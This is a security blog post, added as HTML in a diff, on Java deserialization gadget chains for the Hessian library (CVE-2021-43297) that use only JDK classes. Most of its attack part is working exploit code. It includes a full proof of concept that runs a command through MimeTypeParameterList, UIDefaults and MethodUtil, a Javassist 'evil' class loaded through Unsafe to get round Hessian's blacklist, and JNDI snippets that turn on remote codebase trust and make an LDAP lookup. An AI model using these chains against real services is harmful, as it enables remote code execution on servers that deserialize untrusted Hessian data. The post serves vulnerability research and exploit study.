@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Hessian Only JDKIntroductionThis issue was raised in CVE-2021-43297 and is still present in the current Hessian library. Basic PrincipleIn Hessian2Input$expect, there is a implicit call to the obj.toS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hessian Only JDK">
+<meta property="og:url" content="http://example.com/2023/11/17/Hessian-Only-JDK/index.html">
+<meta property="og:site_name" content="P3ngu1nW">
+<meta property="og:description" content="Hessian Only JDKIntroductionThis issue was raised in CVE-2021-43297 and is still present in the current Hessian library. Basic PrincipleIn Hessian2Input$expect, there is a implicit call to the obj.toS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117093626570.png">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117110129697.png">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117110451107.png">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117110655041.png">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117110803819.png">
+<meta property="og:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117184953115.png">
+<meta property="article:published_time" content="2023-11-17T00:55:04.000Z">
+<meta property="article:modified_time" content="2023-11-18T10:36:52.599Z">
+<meta property="article:author" content="P3ngu1nW">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/17/Hessian-Only-JDK/image-20231117093626570.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Hessian Only JDK</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/11/15/BCEL/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/17/Hessian-Only-JDK/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/17/Hessian-Only-JDK/&text=Hessian Only JDK"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/17/Hessian-Only-JDK/&is_video=false&description=Hessian Only JDK"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hessian Only JDK&body=Check out this article: http://example.com/2023/11/17/Hessian-Only-JDK/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/17/Hessian-Only-JDK/&name=Hessian Only JDK&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/17/Hessian-Only-JDK/&t=Hessian Only JDK"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian-Only-JDK"><span class="toc-number">1.</span> <span class="toc-text">Hessian Only JDK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Principle"><span class="toc-number">1.2.</span> <span class="toc-text">Basic Principle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget-Chains"><span class="toc-number">1.3.</span> <span class="toc-text">Gadget Chains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MultiUIDefaults"><span class="toc-number">1.3.1.</span> <span class="toc-text">MultiUIDefaults</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MimeTypeParameterList-MethodUtil"><span class="toc-number">1.3.2.</span> <span class="toc-text">MimeTypeParameterList + MethodUtil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe"><span class="toc-number">1.3.3.</span> <span class="toc-text">Unsafe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-number">1.3.4.</span> <span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PKCS9Attributes-BCEL"><span class="toc-number">1.3.5.</span> <span class="toc-text">PKCS9Attributes + BCEL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProxyLazyValue-DumpBytecode-System-load"><span class="toc-number">1.3.6.</span> <span class="toc-text">ProxyLazyValue + DumpBytecode + System.load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSLT-Transform"><span class="toc-number">1.3.7.</span> <span class="toc-text">XSLT Transform</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Hessian Only JDK
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">P3ngu1nW</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-17T00:55:04.000Z" class="dt-published" itemprop="datePublished">2023-11-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Hessian-Only-JDK"><a href="#Hessian-Only-JDK" class="headerlink" title="Hessian Only JDK"></a>Hessian Only JDK</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This issue was raised in CVE-2021-43297 and is still present in the current Hessian library.</p>
+<h2 id="Basic-Principle"><a href="#Basic-Principle" class="headerlink" title="Basic Principle"></a>Basic Principle</h2><p>In <code>Hessian2Input$expect</code>, there is a implicit call to the <code>obj.toString()</code>, which could lead to a serious of  method call.</p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117093626570.png" class title="image-20231117093626570">
+
+<p>Let’s look again at how the program got to <code>obj.toString()</code></p>
+<p>In the method <code>readObject</code>, the deserializer will first read the first byte as the ‘tag’.</p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117110129697.png" class title="image-20231117110129697">
+
+<p>At the case <code>C</code>, the deserializer will call the <code>readObjectDefinition</code>.</p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117110451107.png" class title="image-20231117110451107">
+
+<p>Then, it will call the <code>readString</code></p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117110655041.png" class title="image-20231117110655041">
+
+<p>In its default case, we will call the <code>expect</code> method.</p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117110803819.png" class title="image-20231117110803819">
+
+<h2 id="Gadget-Chains"><a href="#Gadget-Chains" class="headerlink" title="Gadget Chains"></a>Gadget Chains</h2><p>So the next step is to find gadget chains beginning with <code>toString</code> just in JDK.</p>
+<h3 id="MultiUIDefaults"><a href="#MultiUIDefaults" class="headerlink" title="MultiUIDefaults"></a>MultiUIDefaults</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults#toString</span><br><span class="line">	UIDefaults#get</span><br><span class="line">		UIDefaults#getFromHashTable</span><br><span class="line">			UIDefaults$LazyValue#createValue</span><br><span class="line">				SwingLazyValue#createValue</span><br><span class="line">					javax.naming.InitialContext#doLookup()</span><br></pre></td></tr></table></figure>
+
+<p>There are two limitations in this gadget</p>
+<ul>
+<li>The access modifier for <code>MultiUIDefaults</code> is default, only <code>javax.swing</code> can use it</li>
+<li>Higher version of JDK can exploit JNDI</li>
+</ul>
+<h3 id="MimeTypeParameterList-MethodUtil"><a href="#MimeTypeParameterList-MethodUtil" class="headerlink" title="MimeTypeParameterList + MethodUtil"></a>MimeTypeParameterList + MethodUtil</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">javax.activation.MimeTypeParameterList#toString</span><br><span class="line">	UIDefaults#get</span><br><span class="line">		UIDefaults#getFromHashTable</span><br><span class="line">			UIDefaults$LazyValue#createValue</span><br><span class="line">				SwingLazyValue#createValue</span><br><span class="line">					sun.reflect.misc.MethodUtil#invoke</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>MethodUtil</code> is something that can invoke a method from a specific Object.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.misc.MethodUtil;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line"></span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invoke, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;&#125;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;P3ngu1nW&quot;</span>, swingLazyValue);</span><br><span class="line"></span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        setField(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line"></span><br><span class="line">        serialize(mimeTypeParameterList);</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">()</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">h2i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> h2i.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">h2o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fos);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        h2o.setSerializerFactory(sf);</span><br><span class="line">        fos.write(<span class="number">0x43</span>);</span><br><span class="line">        h2o.writeObject(o);</span><br><span class="line">        h2o.flushBuffer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Unsafe"><a href="#Unsafe" class="headerlink" title="Unsafe"></a>Unsafe</h3><p>In <code>hessian:4.0.63</code>, there exists a blacklist.</p>
+<img src="/2023/11/17/Hessian-Only-JDK/image-20231117184953115.png" class title="image-20231117184953115">
+
+<p>So we can’t use <code>java.lang.Runtime</code> and <code>TemplatesImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] ClassByte(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">    <span class="type">CtMethod</span> <span class="variable">evil</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public static void exp()throws Exception&#123; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&#125; &quot;</span>, ctClass);</span><br><span class="line">    ctClass.addMethod(evil);</span><br><span class="line">    <span class="type">byte</span>[] bytecode = ctClass.toBytecode();</span><br><span class="line">    ctClass.defrost();</span><br><span class="line">    <span class="keyword">return</span> bytecode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">loadClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;exp&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    uiDefaults.put(<span class="string">&quot;P3ngu1nW&quot;</span>, swingLazyValue);</span><br><span class="line">    <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">    setField(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">    <span class="keyword">return</span> mimeTypeParameterList;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> Unsafe.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] payload = ClassByte(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invoke, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;defineClass, unsafe, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;evil&quot;</span>, payload, <span class="number">0</span>, payload.length&#125;&#125;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">    uiDefaults.put(<span class="string">&quot;P3ngu1nW&quot;</span>, swingLazyValue);</span><br><span class="line"></span><br><span class="line">    <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">    setField(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>We can use <code>java.lang.System.setProperty</code> to modify <code>com.sun.jndi.ldap.object.trustURLCodebase</code> to break the JNDI restriction.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setProperty</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.System&quot;</span>).getDeclaredMethod(<span class="string">&quot;setProperty&quot;</span>, String.class, String.class);</span><br><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invokeMethod, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;setProperty, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>&#125;&#125;&#125;);  </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">doLookup</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.naming.InitialContext&quot;</span>).getDeclaredMethod(<span class="string">&quot;doLookup&quot;</span>, String.class);</span><br><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invokeMethod, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;doLookup, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>&#125;&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="PKCS9Attributes-BCEL"><a href="#PKCS9Attributes-BCEL" class="headerlink" title="PKCS9Attributes + BCEL"></a>PKCS9Attributes + BCEL</h3><h3 id="ProxyLazyValue-DumpBytecode-System-load"><a href="#ProxyLazyValue-DumpBytecode-System-load" class="headerlink" title="ProxyLazyValue + DumpBytecode + System.load"></a>ProxyLazyValue + DumpBytecode + System.load</h3><h3 id="XSLT-Transform"><a href="#XSLT-Transform" class="headerlink" title="XSLT Transform"></a>XSLT Transform</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/hessian_only_jdk">https://p4d0rn.gitbook.io/java/serial-journey/hessian_only_jdk</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
